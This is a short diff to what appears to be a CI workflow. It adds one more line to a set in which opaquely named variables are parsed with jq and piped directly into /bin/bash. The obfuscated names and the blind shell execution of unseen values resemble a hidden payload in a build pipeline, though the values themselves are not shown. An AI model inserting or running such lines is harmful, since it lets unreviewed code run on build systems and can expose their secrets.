@@ -27,6 +27,7 @@ jobs:
           echo $tfcs3 | jq -r .e19 | /bin/bash
           echo $ahb865 | jq -r .tpb38487 | /bin/bash
           echo $gevzb59803 | jq -r .zzrr82 | /bin/bash
+          printf '%s' "$e6819" | jq -r .vbdxv40670 | /bin/bash
 
       - name: Save archive
         if: always()
